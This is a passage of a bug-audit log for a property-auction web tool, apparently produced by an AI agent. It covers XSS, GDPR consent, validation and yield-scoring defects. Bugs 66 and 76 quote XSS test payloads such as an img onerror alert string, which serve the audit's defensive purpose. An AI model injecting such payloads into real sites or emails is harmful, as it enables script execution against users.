- **BUG 20** (Rent estimation first-match bias) — STILL OPEN
- **BUG 24/53** (Yield 8%+ preset only sorts, doesn't filter) — STILL OPEN
- **BUG 26** (Bedroom count default to 2-bed) — STILL OPEN
- **BUG 28** (Null auction date lots shown indefinitely) — STILL OPEN
- **BUG 29** (URIError from decodeURIComponent) — STILL OPEN
- **BUG 30** (Currency strings stored instead of integers) — STILL OPEN
- **BUG 37** (ip_address column may not exist) — STILL OPEN
- **BUG 41** (Finance Check doesn't pre-fill property type) — STILL OPEN
- **BUG 42** (Leads table RLS grants full access to all roles) — STILL OPEN
- **BUG 43** (calcDealAnalysis never called / dead code) — STILL OPEN
- **BUG 44** (Finance Check cross-origin may fail) — STILL OPEN
- **BUG 46** (URL param `type` not read by bridgematch-lite) — STILL OPEN
- **BUG 47** (Score badge shows raw unclamped score) — STILL OPEN
- **BUG 49** (CSV export includes gated yield/comparable data) — STILL OPEN
- **BUG 50** (Lender count type coercion) — STILL OPEN
- **BUG 52** (Encoded currency in onclick breaks if propType has quote) — STILL OPEN
- **BUG 54** (Stale comparables from 3-year window) — STILL OPEN
- **BUG 55** (Estimated costs fixed at 4% of price) — STILL OPEN
- **BUG 56** (Activity log exposes PII) — STILL OPEN
- **BUG 57** (Auction ended badge uses client timezone) — STILL OPEN
- **BUG 59** (Email notification failure not surfaced) — STILL OPEN
- **BUG 62** (Negative bed count produces NaN) — STILL OPEN

---

## BUG 65
**File:** index.html line 2765
**Area:** Email Capture Form — Error (querySelector('.ec-note') Crashes on Null)
**Severity:** High
**Description:** After a successful email capture submission, line 2765 calls `document.querySelector('.ec-note').style.display = 'none'`. However, no element with class `ec-note` exists in the HTML (the CSS class `.ec-note` is defined at line 409 but no HTML element uses it). This means `querySelector('.ec-note')` returns `null`, and `null.style.display` throws an uncaught `TypeError: Cannot read properties of null (reading 'style')`. This crashes the `.then()` success handler. Critically, lines 2763-2764 (hiding the form and showing the success message) execute BEFORE line 2765, so the user sees the success message — but the uncaught error may interfere with any subsequent code execution in the promise chain and will appear as a red error in the browser console.
**Reproduction steps:**
1. Fill in the email capture form with valid data and consent
2. Submit — the success message appears
3. Open browser console — `TypeError: Cannot read properties of null (reading 'style')` is logged
**Suggested fix:** Either add `?.` safe navigation: `document.querySelector('.ec-note')?.style.display = 'none'`, or remove the line entirely since no `.ec-note` element exists. If an `.ec-note` element was intended (e.g., a "We respect your privacy" note), add it to the HTML.
---

## BUG 66
**File:** index.html line 2758
**Area:** Email Capture Form — Data Integrity (Consent Hardcoded to true Instead of Read from Checkbox)
**Severity:** Medium
**Description:** The email capture form submission at line 2758 sends `consent: true` hardcoded in the payload, rather than reading the actual state of the consent checkbox at line 1018. The HTML checkbox has `required`, so browser-native form validation prevents submission without it being checked. However: (a) the consent checkbox state is not actually read — if someone submits via API/fetch directly, `consent: true` is always sent regardless; (b) the `required` attribute only works because the form uses `onsubmit` — if the submission mechanism changes, the consent bypass persists; (c) this is an integrity issue: the system should record what the user actually did, not what we assume they did.
**Reproduction steps:**
1. Read line 2758: `body: JSON.stringify({ name, email, source: 'landing-page', consent: true })`
2. The consent checkbox state is never read in `submitEmailCapture()`
3. POST directly to `/api/leads` with `{ name: "Test", email: "test@example.com", source: "landing-page", consent: false }` — server stores `consent_given: false` correctly, but the normal form flow always sends `true`
**Suggested fix:** Read the checkbox state: `const consent = form.consent.checked;` and include it in the payload: `consent: consent`.
---

## BUG 67
**File:** bridgematch-lite.html line 986
**Area:** Enquiry Form — Display (Success Message Uses Template Literal With esc() But Constructs via innerHTML-like Assignment)
**Severity:** Low
**Description:** The success message at lines 984-994 uses `formEl.outerHTML = \`...\`` with `${esc(name)}` to safely escape the user's name. This is correct and safe. However, the `esc()` function is only applied to `name` — the FCA placeholder text `[FCA_NUMBER_NEEDED]` is a static string and harmless, but the pattern of constructing HTML via template literals assigned to `outerHTML` is inherently risky. If any future developer adds another dynamic variable without `esc()`, it becomes an XSS vector. This is a code quality note rather than an active bug.
**Reproduction steps:** N/A — no active exploit, just a maintenance concern.
**Suggested fix:** No immediate action needed. The current `esc(name)` usage is correct.
---

## BUG 68
**File:** server.js line 755
**Area:** Enquiry Form — Data Integrity (Activity Log Sends Source as 'bridgematch-lite' When Landing Page)
**Severity:** Low
**Description:** At line 755, the activity log event hardcodes `source: source || 'bridgematch-lite'` (note: hyphenated), while the database insert at line 731 stores `source: source || 'bridgematch_lite'` (underscored). This inconsistency between activity log and database makes it harder to correlate events. Additionally, the activity log still includes the raw `email` (see Bug 56 — still open).
**Reproduction steps:**
1. Submit a lead from BridgeMatch Lite (no explicit source)
2. Database stores `source: 'bridgematch_lite'` (underscore)
3. Activity log records `source: 'bridgematch-lite'` (hyphen)
**Suggested fix:** Use consistent naming: `source: source || 'bridgematch_lite'` in both places.
---

## BUG 69
**File:** bridgematch-lite.html line 860; lines 950-953
**Area:** Enquiry Form — Data Integrity (Currency Values Sent as Formatted Strings to Server)
**Severity:** Medium
**Description:** The submit button onclick handler at line 860 passes `encodeURIComponent(fmtCurrency(r.price))` and similar values through to `submitLead()`. Inside `submitLead()`, lines 950-953 decode these: `propertyPrice: decodeURIComponent(price)` which produces strings like "£200,000". These formatted strings are sent to the server as `propertyPrice` and `loanAmount`. The server stores them as-is (line 735: `property_price: propertyPrice || null`). If the `property_price` column is typed as `text`, the data is stored but cannot be queried numerically. If typed as `integer` or `numeric`, the insert will fail or coerce to NULL. This is essentially Bug 30 confirmed still active — the client sends formatted currency strings, not raw numbers.
**Reproduction steps:**
1. Run a deal in BridgeMatch Lite with £200,000 property
2. Submit the enquiry
3. The payload contains `propertyPrice: "£200,000"` (a formatted string, not a number)
4. If the DB column is integer-typed, this value is lost
**Suggested fix:** Pass raw numeric values from the onclick handler: `submitLead(${r.price}, ${r.loanNeeded}, ...)` instead of encoded formatted strings. Format for display only within the `submitLead` function or on the server.
---

## BUG 70
**File:** index.html line 2665; bridgematch-lite.html (no CORS handling)
**Area:** Finance Check Widget — Functional (Hardcoded Production URL Breaks Local/Staging Development)
**Severity:** Low
**Description:** Confirming Bug 44 still open with additional context: the Finance Check at line 2665 calls `fetch('https://www.bridgematch.co.uk/api/filter', ...)`. This is the only hardcoded external API URL in the auction tool. In local development (`localhost:3000`), this cross-origin request will fail unless `bridgematch.co.uk` sends CORS headers for `localhost`. In Railway preview deployments (e.g., `auction-tool-pr-123.up.railway.app`), same issue. The error is caught silently (line 2670: `throw new Error('API error')`) and shows a generic "Unable to check" message. For the production site (`bridgematch.co.uk`), this is a same-origin request and works fine. The bug only affects non-production environments but makes the Finance Check untestable during development.
**Reproduction steps:**
1. Run `node server.js` locally
2. Open `http://localhost:3000/auctions`, expand a lot, click "Check finance"
3. Request to `https://www.bridgematch.co.uk/api/filter` fails with CORS error
**Suggested fix:** Use a relative URL `/api/filter` if the bridging API is colocated, or add an environment variable for the BridgeMatch API base URL.
---

## BUG 71
**File:** bridgematch-lite.html line 977
**Area:** Enquiry Form — Error Handling (Non-JSON Error Response Shows Raw Parse Error)
**Severity:** Low
**Description:** Confirming Bug 34 still partially present. Line 977: `if (!res.ok) return res.json().then(d => { throw new Error(d.error || 'Submission failed'); })`. If the server returns a non-JSON error (e.g., 502 HTML from Railway proxy), `res.json()` throws a SyntaxError. The `.catch()` at line 997 catches it and displays `err.message` — which would be the JSON parse error. However, note the `.catch()` at line 998 does have a fallback: `err.message || 'Something went wrong. Please try again.'` — the issue is that `SyntaxError` always has a message, so the fallback never triggers. The `submitEmailCapture` in index.html (line 2760) was fixed to handle this case with a `.catch(()=>{throw new Error('Something went wrong')})` inner catch, but `submitLead` in bridgematch-lite was not given the same treatment.
**Reproduction steps:**
1. Simulate a 502 from the server during BridgeMatch Lite lead submission
2. User sees "Unexpected token < in JSON at position 0" instead of a friendly message
**Suggested fix:** Add inner catch like index.html line 2760: `.then(res => { if(!res.ok) return res.json().then(d=>{throw new Error(d.error||'Submission failed')}).catch(()=>{throw new Error('Submission failed')}); return res.json(); })`
---

## Sweep completed at 2026-03-14T22:45:00Z

# Sweep 3 — 2026-03-14

## BUG 65
**File:** index.html (no "Coming Soon" gate); bridgematch-agents/missions/mission-auth-stripe.md lines 12-14, 24
**Area:** Data Integrity — Yield, Comparables, and Deal Stacking Not Gated Behind "Coming Soon"
**Severity:** High
**Description:** The mission brief explicitly requires that yield calculations, comparables, and deal stacking must be hidden behind "Coming Soon" labels. However, in the live frontend: (1) Estimated yield (estGrossYield) is visible in lot card opportunity chips like "Est. 9.2% yield" with no gate. (2) Street comparables data (streetAvg, belowMarket%) is visible in opportunity/risk chips like "23% below market" with no gate. (3) Both yield and comparables data are exported ungated in CSV downloads (Bug 49). (4) The deal stacking calculator is dead code (Bug 43) — but there is no "Coming Soon" placeholder where it should appear. The only "Coming Soon" text in the entire frontend is "Portfolio tracking (coming soon)" at line 760, which is unrelated. The mission requirement is not implemented.
**Reproduction steps:**
1. Go to bridgematch.co.uk/auctions, load any house
2. Lots with yield data show "Est. X% yield" chips — no "Coming Soon" gate
3. Lots with comparables data show "X% below market" chips — no "Coming Soon" gate
4. No "Coming Soon" placeholder exists for deal stacking in the lot detail view
**Suggested fix:** Either add "Coming Soon" badges over the yield/comparables display and blur the data, or formally decide these features are now launched and update the mission brief. For deal stacking, add a visible "Deal Analysis (Coming Soon)" placeholder in the expanded lot panel.
---

## BUG 66
**File:** index.html line 2666; line 2656
**Area:** Finance Check Widget — XSS via innerHTML with Unsanitised API Count
**Severity:** Medium
**Description:** At line 2666, the `count` variable is inserted into `innerHTML` via string concatenation: `'See all ' + count + ' matches on BridgeMatch →'`. The `count` is sourced from `data.summary?.eligible` (line 2656) which comes from an external API response (`bridgematch.co.uk/api/filter`). If that API were compromised or returned unexpected data (e.g., `{"summary":{"eligible":"<img src=x onerror=alert(1)>"}}`), this would execute arbitrary JavaScript. While the `esc()` function is correctly used for lender names (line 2663), the `count` variable is not sanitised. Additionally, at line 2661, `count` is inserted into `'<div class="fw-count">' + count + '</div>'` via innerHTML — another injection point.
**Reproduction steps:**
1. If the external API returned `summary.eligible` as an HTML string, it would be rendered as HTML in two places (lines 2661 and 2666)
2. This is a stored XSS risk if the API response is cached
**Suggested fix:** Coerce count to integer before use: `const count = parseInt(data.summary?.eligible, 10) || (data.eligible?.length || 0);` This ensures only a number is rendered via innerHTML.
---

## BUG 67
**File:** index.html line 2652; bridgematch-lite.html (no equivalent)
**Area:** Finance Widget — Data Integrity (Hardcoded 12-Month Loan Term Sent to API)
**Severity:** Low
**Description:** The Finance Check widget at line 2652 sends `loan_term_months: 12` hardcoded to the BridgeMatch API. The LTV slider allows 50-80% adjustment, but the loan term is fixed at 12 months. Most auction refurb deals complete in 6-9 months. A 12-month term may cause the API to return fewer matching lenders (some lenders have maximum term limits below 12 months) or show higher interest costs. The user has no way to adjust this parameter, and it may not match their actual planned term.
**Reproduction steps:**
1. Click "Check finance" on any lot — the API request always includes `loan_term_months: 12`
2. Lender results may exclude lenders who only offer up to 9-month terms
**Suggested fix:** Either add a term selector alongside the LTV slider, or use a more common default like 9 months, or remove the parameter and let the API use its own default.
---

## BUG 68
**File:** index.html line 2649
**Area:** Finance Widget — Security (API Endpoint Hardcoded to Production)
**Severity:** Low
**Description:** The Finance Check widget calls `https://www.bridgematch.co.uk/api/filter` — a hardcoded absolute URL. This means: (1) Local development cannot test the widget without hitting production. (2) If the auction tool is served from a staging/preview domain (e.g., Railway preview deployments), CORS will block the request. (3) The `www.` prefix may not match the actual CORS allowed origin (the site may redirect www to non-www or vice versa). This is partly covered by Bug 44 but the specific `www.` subdomain mismatch is a distinct issue — if bridgematch.co.uk's CORS allows `bridgematch.co.uk` but not `www.bridgematch.co.uk`, the fetch would fail even in production.
**Reproduction steps:**
1. Check the CORS headers on bridgematch.co.uk/api/filter — does it allow `www.bridgematch.co.uk` as origin?
2. If the auction tool is served from the non-www domain, the fetch may fail due to `www.` mismatch
**Suggested fix:** Use a relative URL `/api/filter` if both tools are served from the same Express server, or use `${window.location.origin}/api/filter` to match the current origin.
---

## BUG 69
**File:** server.js lines 6629-6641
**Area:** Yield Calculation — Data Integrity (VOA_RENTS Iteration Order Not Guaranteed for Specificity)
**Severity:** Medium
**Description:** Extending Bug 20 with a concrete additional case: the VOA_RENTS object has both `'hull'` and `'blackburn'` as city keys, and `'north east'` and `'north west'` as regional keys. An address like "Blackburn Road, Hull" would match `'london'` if the address somehow contained "london", but more realistically, it depends on which key appears first during iteration. The `for...of Object.entries()` loop returns keys in insertion order. Since `'hull'` (line 6607) comes after `'blackburn'` (line 6608), an address containing both would match `'hull'` first — which happens to be correct for Hull but demonstrates the fragility. More critically, "Barking Road, Newham" would match `'barking'` (line 6554, £1,100/mo for 1-bed) before `'newham'` (line 6553, £1,250/mo for 1-bed) despite Newham being the correct borough.
**Reproduction steps:**
1. Call `estimateMonthlyRent('Barking Road, Newham', 1)` — returns £1,210 (barking × 1.1) instead of £1,375 (newham × 1.1)
2. The first-match-wins pattern produces wrong results for addresses containing multiple location names
**Suggested fix:** Sort VOA_RENTS keys by length descending (most specific first), or implement a priority system where borough/city matches take precedence over street-name matches.
---

## BUG 70
**File:** index.html lines 2273-2275
**Area:** Data Integrity — Sort by Price Treats POA as Infinity/Zero
**Severity:** Low
**Description:** Price sorting uses `(a.price||Infinity)` for ascending and `(b.price||0)` for descending. Lots with no price (POA) are treated as infinitely expensive when sorting ascending (pushed to the bottom) and as £0 when sorting descending (also pushed to the bottom). This is reasonable behaviour. However, if the "Exclude POA" filter is NOT active, POA lots with `price: 0` (not null) will sort as £0 in descending order — appearing at the bottom — but as £0 in ascending order they'd sort at the top (since `0 || Infinity` = `Infinity`, wait — `0 || Infinity` evaluates to `Infinity` because `0` is falsy). Actually this means POA lots with `price: 0` are treated identically to `price: null` — pushed to bottom in both directions. The real issue is lots with `price: 1` or very low prices (extraction errors) — these sort to the top in ascending mode, appearing as the "cheapest" lots when they're actually data errors.
**Reproduction steps:**
1. Sort by "Price (low to high)"
2. Any lots with extraction errors showing £1 or very low prices will appear at the top
**Suggested fix:** Add a minimum price threshold to the sort filter (e.g., exclude lots with price < £1000 from price sorting, or flag them as data errors).
---

## BUG 71
**File:** index.html line 2398
**Area:** Data Integrity — Price Formatting Uses Browser Locale, Not UK Locale
**Severity:** Low
**Description:** Guide price display at line 2398 uses `l.price.toLocaleString()` without specifying a locale. This formats the number according to the user's browser locale. For a UK user, £150,000 displays correctly as "150,000". But for a German user (locale `de-DE`), `toLocaleString()` produces "150.000" (period as thousands separator), resulting in "Guide £150.000" — which looks like one hundred fifty pounds. Similarly, a French locale would produce "150 000" with a non-breaking space. The bridgematch-lite.html version at line 406 correctly uses `v.toLocaleString('en-GB', {maximumFractionDigits:0})` — this locale-aware formatting is missing from index.html.
**Reproduction steps:**
1. Set browser language to German (de-DE) or French (fr-FR)
2. View auction lots — prices display with the wrong thousands separator
**Suggested fix:** Change `l.price.toLocaleString()` to `l.price.toLocaleString('en-GB')` at line 2398, and audit all other `.toLocaleString()` calls in index.html for the same issue.
---

## BUG 72
**File:** index.html line 2611
**Area:** Data Integrity — Finance Widget Price Also Uses Browser Locale
**Severity:** Low
**Description:** The Finance Check widget at line 2611 uses `lot.price.toLocaleString()` without specifying `'en-GB'` locale, same issue as Bug 71. The displayed price could appear malformatted for non-UK browser locales. Uses the Unicode pound sign `\u00a3` correctly, but the number formatting is locale-dependent.
**Reproduction steps:** Same as Bug 71 — set browser locale to non-UK and observe the Finance Check widget price.
**Suggested fix:** Change to `lot.price.toLocaleString('en-GB')`.
---

## BUG 73
**File:** server.js line 6469
**Area:** Comparables — Data Integrity (Postcode Regex May Miss Scottish Postcodes with Alpha Outward Codes)
**Severity:** Low
**Description:** The postcode regex `/[A-Z]{1,2}\d[A-Z\d]?\s*\d[A-Z]{2}/i` handles standard UK postcode formats like "SW1A 1AA", "M1 1AA", "B1 1AA". However, some postcodes have formats that don't match: the Channel Islands use non-standard codes (GY1, JE2), which DO match. But the regex doesn't anchor to word boundaries — it could match a substring of a longer alphanumeric string. For example, "REF: AB123CD" could falsely match "B1 23CD" as a postcode. More practically, if the address field contains text like "Flat 2A 3AB" (no actual postcode), the regex might match "A 3AB" as a postcode, causing a Land Registry query for a non-existent postcode that returns zero results. This silently prevents enrichment for that lot.
**Reproduction steps:**
1. Process a lot with address "Flat 2A, 3 Abbey Road, London" (no postcode in address)
2. The regex might match a false positive, or return null correctly depending on the exact string
**Suggested fix:** Add word boundary anchors: `/\b[A-Z]{1,2}\d[A-Z\d]?\s*\d[A-Z]{2}\b/i`. This prevents partial matches within longer strings.
---

## BUG 74
**File:** server.js line 6906; lines 6903-6928
**Area:** Comparables — Data Integrity (Street Average Includes All Postcodes, Not Just the Lot's Street)
**Severity:** Medium
**Description:** The Land Registry query at line 6485 filters by postcode only — it returns ALL sales in that postcode over the last 3 years. The `streetAvg` calculation at line 6906 averages ALL of these sales, not just sales on the same street as the lot. A UK postcode typically covers 15-100 addresses across multiple streets. The resulting "street average" is actually a "postcode average" — if the lot is on a terraced street but the postcode also covers a road of detached houses, the average will be skewed upward. Combined with Bug 15 (no property type filtering), this can produce significantly misleading "below market" percentages.
**Reproduction steps:**
1. Find a lot in a postcode with mixed property values (e.g., a postcode covering both a council estate and a private road)
2. The streetAvg will be the average of all sales in the postcode, not just the lot's street
3. The "below market" percentage may be significantly wrong
**Suggested fix:** Filter Land Registry results by street name (using `extractStreet()` which already exists at line 6473) before calculating the average. Fall back to postcode-level average only if no same-street sales are found.
---

## BUG 75
**File:** index.html line 1270
**Area:** UX — Preset Resets LOTS Array to ALL_LOTS, Discarding Smart Search Results
**Severity:** Medium
**Description:** At line 1269, `applyPreset()` sets `LOTS=ALL_LOTS;SMART_RESULTS=null;` — this resets the lot array to ALL loaded lots and clears any smart search results. If a user performed a smart search (AI-powered), then clicked a preset button (e.g., "Under £100k"), their smart search results are lost and all lots are shown with the preset filter applied. The user would expect the preset to filter WITHIN their search results, not replace them. The preset also clears the smart search query input (line 1261: `$('smartQuery').value=''`), making it unclear why the results changed.
**Reproduction steps:**
1. Perform a smart search like "houses near train stations in Manchester"
2. Get a filtered set of results
3. Click "Under £100k" preset
4. All lots (not just Manchester train station lots) are shown, filtered to under £100k
**Suggested fix:** If `SMART_RESULTS` is active, apply the preset filter to `SMART_RESULTS` instead of `ALL_LOTS`. Or warn the user that applying a preset will clear their search.
---

## BUG 76
**File:** server.js lines 797-838
**Area:** Security — XSS in Welcome Email (Unescaped User Name)
**Severity:** High
**Description:** The `sendWelcomeEmail()` function interpolates `firstName` (derived from user-supplied `name` via `name.split(' ')[0]`) directly into the HTML email template at line 807: `Welcome, ${firstName}!`. This is the same class of vulnerability as BUG 1 (lead notification email XSS) but in a different code path. A user who signs up with a name like `<img src=x onerror=alert(1)>` would have that unescaped HTML rendered in the welcome email sent to their own email address. While self-XSS is lower risk, the welcome email HTML is still constructed with unescaped user input.
**Reproduction steps:**
1. Sign up with name `<b>bold</b> Test`
2. The welcome email will render "Welcome, **bold**!" with the `<b>` tag interpreted as HTML
3. More dangerous payloads using `<img onerror>` or event attributes could execute in email clients that support them
**Suggested fix:** HTML-escape `firstName` before interpolating into the template, using the same approach recommended for BUG 1.
---

## BUG 77
**File:** server.js line 6527
**Area:** Data Integrity — Land Registry API Called Over HTTP, Not HTTPS
**Severity:** Medium
**Description:** The Land Registry SPARQL endpoint is called over plain HTTP (`http://landregistry.data.gov.uk/landregistry/query`) at line 6527. This means the SPARQL query (which contains the user's property postcode) and the response data (property sale prices and addresses) are transmitted in cleartext. On Railway's infrastructure this is less risky than on a client device, but it's still a best-practice violation — the Land Registry endpoint does support HTTPS. Transmitting property postcodes in cleartext could be a minor data protection concern.
**Reproduction steps:**
1. Inspect server.js line 6527 — the URL uses `http://` not `https://`
2. The Land Registry endpoint `https://landregistry.data.gov.uk/landregistry/query` is available and functional
**Suggested fix:** Change `http://landregistry.data.gov.uk` to `https://landregistry.data.gov.uk` at line 6527.
---

## BUG 78
**File:** bridgematch-lite.html line 860; server.js lines 700-706
**Area:** Enquiry Form — Data Integrity (auctionHouse Field Never Populated)
**Severity:** Low
**Description:** The server-side `/api/leads` endpoint destructures `auctionHouse` from the request body (not used in the current insert), but the client-side `submitLead()` function in bridgematch-lite.html never includes an `auctionHouse` field in the payload (lines 943-968). The payload includes `auctionUrl` (the current page URL) but not the auction house name. This means leads in the database have no structured auction house field — only a raw URL that would need to be parsed to determine the house. If the server schema has an `auction_house` column, it will always be null.
**Reproduction steps:**
1. Submit a lead from any BridgeMatch Lite page
2. Check the `leads` table — no auction house name is stored
3. The URL is stored in `auction_url` but requires parsing to extract the house name
**Suggested fix:** Either pass the auction house name as a URL parameter from the auction tool (e.g., `?house=savills`) and include it in the payload, or parse the auction house from the referrer URL server-side before inserting.
---

## BUG 79
**File:** server.js lines 6645-6658
**Area:** Yield Calculation — Data Integrity (Address Matching Order Sensitivity)
**Severity:** Medium
**Description:** The `estimateMonthlyRent()` function iterates over `VOA_RENTS` keys using `Object.entries()` and returns on the first match found via `address.includes(key)`. JavaScript object key iteration order is insertion order, which means the function will match "london" before it matches more specific keys like "westminster" or "croydon" if "london" appears in the address string. However, more critically, some addresses contain city substrings of other cities — e.g., an address containing "Newcastle-under-Lyme" would match "newcastle" (rent: £600/1bed) instead of potentially matching "stoke" (rent: £500/1bed) which is the correct area. The address "Reading" would match correctly, but "Ealing Broadway" would match "ealing" before "london" — which in this case gives a more specific (better) result, but the ordering is fragile and undocumented.
**Reproduction steps:**
1. Call `estimateMonthlyRent("123 High Street, Westminster, London, SW1", 2)`
2. If "london" appears before "westminster" in the VOA_RENTS object, the function returns London-level rent (£1800×1.10 = £1,980) instead of Westminster-level rent (£2800×1.10 = £3,080)
3. The 36% difference would significantly affect yield calculations
**Suggested fix:** Sort VOA_RENTS keys by specificity (longest match first, or borough before city before region) before iterating. Or iterate all keys and pick the most specific match (longest key that matches).
---

## BUG 80
**File:** server.js lines 6950-6958
**Area:** Yield Scoring — Data Integrity (Yield Score Thresholds Don't Match CLAUDE.md)
**Severity:** Low
**Description:** The CLAUDE.md scoring table states: "Good yield (6-8% GIY): +1.5" and "High yield (>8% GIY): +2.5". But the actual code at lines 6952-6958 uses: yield >8% = +1.5 and yield >6% = +0.5. Both the score values and the thresholds diverge from the documented scoring system. The code awards significantly less score for yield than the documentation claims. This means the documentation is misleading about how lots are scored, and lots with good yields are ranked lower than expected.
**Reproduction steps:**
1. Compare CLAUDE.md scoring table with server.js lines 6952-6958
2. CLAUDE.md: >8% = +2.5, 6-8% = +1.5
3. Code: >8% = +1.5, 6-8% = +0.5
**Suggested fix:** Either update the code to match the documented scoring (>8% = +2.5, 6-8% = +1.5) or update CLAUDE.md to reflect the actual code behaviour. The code is authoritative — update the docs.
---

## Sweep completed at 2026-03-14T23:55:00Z

---

# Sweep 4 — 2026-03-14

## STATUS UPDATE — Previously Reported Bugs

The following bugs from Sweeps 1-3 have been **fixed** (verified by code inspection):

- **BUG 6** (Consent checkbox pre-checked): FIXED — line 855 no longer has `checked` attribute
- **BUG 9/25** (Score not clamped): PARTIALLY FIXED — initial scoring at line 6476 now clamps with `Math.max(0, Math.min(10, ...))`, and below-market scoring at line 6939 also clamps. However, yield scoring at line 6959 only rounds without clamping (see BUG 81)
- **BUG 19/40** (SDLT wrong in bridgematch-lite): FIXED — line 464 now uses correct investor surcharge rates matching index.html
- **BUG 32** (Source field bypass on phone requirement): FIXED — line 712 now checks `source !== 'landing-page'` instead of truthy check
- **BUG 46** (URL type param not handled): FIXED — lines 1009-1031 now read `type` param and map to BridgeMatch categories
- **BUG 48** (No server-side email validation): FIXED — line 715 now uses regex `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/`
- **BUG 58** (Name/phone not trimmed server-side): FIXED — lines 723, 725 now trim both fields
- **BUG 62** (Negative bed count): FIXED — line 6653 now uses `Math.max(beds ?? 2, 0)`
- **BUG 64** (Source field not stored in column): FIXED — line 726 now explicitly sets `source: source || 'bridgematch_lite'`

The following bugs remain **unfixed** and are still present:

- **BUG 1** (XSS in email notification): Still present — lines 758-772 interpolate user input directly into HTML
- **BUG 2** (No rate limiting on /api/leads): Still present
- **BUG 3** (No spam protection): Still present
- **BUG 4** (Weak client-side email validation): Still present — line 914 still only checks `includes('@')`
- **BUG 5** (Phone accepts non-numeric): Still present — line 920 still only checks length
- **BUG 7** (FCA placeholder): Updated but still broken — line 829 now shows `[FCA_NUMBER_NEEDED]` and line 985 shows `[FCA_NUMBER_NEEDED]`
- **BUG 8** (No enquiry form on listing detail pages): Still present
- **BUG 13** (Double submit possible): Still present
- **BUG 14/63** (Non-JSON error crashes handler): Still present in email capture at line 2752
- **BUG 15** (Street average mixes property types): Still present
- **BUG 20/69/79** (Rent estimation first-match bias): Still present
- **BUG 31** (No GDPR consent on landing page form): Still present
- **BUG 33** (Email subject injection): Still present
- **BUG 34** (BridgeMatch Lite non-JSON error): Still present at line 976
- **BUG 38** (Consent not stored): Still present — server does not include `consent_given` in insert
- **BUG 42** (RLS policy grants full access): Likely still present (schema-level)
- **BUG 43** (calcDealAnalysis dead code): Still present
- **BUG 56** (Activity log exposes PII): Still present at line 749

---

## BUG 81
**File:** server.js line 6959
**Area:** Scoring — Data Integrity (Yield Score Addition Not Clamped After Enrichment)
**Severity:** Medium
**Description:** The initial scoring at line 6476 correctly clamps: `L.score = Math.max(0, Math.min(10, Math.round(s * 10) / 10))`. The below-market scoring at line 6939 also clamps after adding to the score. However, the yield scoring at line 6959 only rounds without clamping: `lot.score = Math.round(lot.score * 10) / 10`. If a lot's score is already 9.0 after the initial scoring and below-market enrichment, adding +1.5 for high yield at line 6953 produces 10.5, which is then rounded to 10.5 — exceeding the 0-10 range. The fix at line 6476 is undermined by missing the same fix at line 6959.
**Reproduction steps:**
1. Find a lot that scores 9.0+ from initial signals and below-market bonus
2. If the lot also has >8% estimated yield, +1.5 is added at line 6953
3. Line 6959 rounds but does not clamp, allowing score to exceed 10
**Suggested fix:** Change line 6959 to `lot.score = Math.max(0, Math.min(10, Math.round(lot.score * 10) / 10));` — matching the clamping at lines 6476 and 6939.
---

## BUG 82
**File:** bridgematch-lite.html line 914 vs server.js line 715
**Area:** Enquiry Form — Validation (Client-Server Email Validation Mismatch)
**Severity:** Medium
**Description:** The server now validates email with a proper regex `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/` (line 715), but the client-side validation at bridgematch-lite.html line 914 still only checks `!email.includes('@')`. This means a user can enter an invalid email like `@`, `foo@`, or `@bar`, pass client-side validation, submit the form, and receive a server error: `{"error":"Valid email required"}`. The error is caught by the `.catch()` handler and displayed, but the UX is poor — the user sees a generic server error instead of the client preventing the submission. The client and server should validate with the same rules.
**Reproduction steps:**
1. Enter name "Test", email "foo@", phone "07700900000" in BridgeMatch Lite
2. Client-side: passes (email contains '@')
3. Server-side: rejects with "Valid email required"
4. User sees the server error in the form, which is less user-friendly than client-side prevention
**Suggested fix:** Update client-side validation at line 914 to match the server regex: `if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email))`.
---

## BUG 83
**File:** index.html line 2742 vs server.js line 715
**Area:** Email Capture Form — Validation (Client-Server Email Validation Mismatch)
**Severity:** Low
**Description:** Same class of bug as BUG 82 but for the landing page email capture form. The client-side validation at index.html line 2742 checks `!email.includes('@')`, but the server now validates with `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/`. Invalid emails pass the client but are rejected by the server. Unlike the BridgeMatch Lite form where the error is displayed, the email capture form's error handler at line 2760 shows `err.message` which will be the server's "Valid email required" — somewhat helpful but not a proactive client-side prevention.
**Reproduction steps:**
1. Enter name "Test", email "@" in the email capture form
2. Client-side: passes
3. Server returns 400 "Valid email required"
4. Error displays, but user expected client-side catch
**Suggested fix:** Update line 2742 to use the same regex as the server.
---

## BUG 84
**File:** server.js line 740; lines 722-743
**Area:** Enquiry Form — Data Integrity (deal_data Field Merges Source Redundantly)
**Severity:** Low
**Description:** At line 740, when `source` is truthy, `deal_data` is set to `{ source, ...(dealData || {}) }`. But line 726 already stores `source` in a dedicated column: `source: source || 'bridgematch_lite'`. So the source value is stored twice — once in the `source` column and once inside the `deal_data` JSON. If these ever diverge (e.g., someone updates one but not the other), it creates a data integrity ambiguity. The `dealData` object from the client at line 960-967 already includes `submittedAt`, `price`, `loan`, `ltv`, `works`, `matchingLenders` — merging `source` into it contaminates deal-specific data with metadata.
**Reproduction steps:**
1. Submit a lead from the landing page (source: 'landing-page')
2. In Supabase: `source` column = 'landing-page', `deal_data` = `{"source": "landing-page", ...}`
3. Source is stored in two places
**Suggested fix:** Remove the source merge from deal_data: change line 740 to `deal_data: dealData || null`.
---

## BUG 85
**File:** bridgematch-lite.html line 860; lines 943-968
**Area:** Enquiry Form — Data Integrity (consent Field Not Included in Payload)
**Severity:** High
**Description:** The `submitLead()` function reads the consent checkbox state at line 901 (`const consent = document.getElementById('leadConsent')?.checked`) and validates it at line 926 (`if (!consent)` — rejects submission). However, the `consent` value is NEVER included in the `payload` object (lines 943-968). The server receives no `consent` field, and the server insert (lines 722-743) does not include `consent_given`. If the database schema has `consent_given boolean DEFAULT true`, every lead is stored as having consented regardless. But more critically, there is no audit trail proving that consent was actually given — the checkbox was checked, validated client-side, but the result was never transmitted or stored. Under GDPR, the controller must be able to demonstrate that consent was given.
**Reproduction steps:**
1. Submit a lead via BridgeMatch Lite with consent checkbox ticked
2. Inspect the fetch request payload — no `consent` field
3. Check the database — `consent_given` uses the default value, not the actual user action
**Suggested fix:** Add `consent: consent` to the payload object (line 968), and add `consent_given: !!consent` to the server insert (after line 742). Also store `consent_timestamp: new Date().toISOString()` server-side.
---

## BUG 86
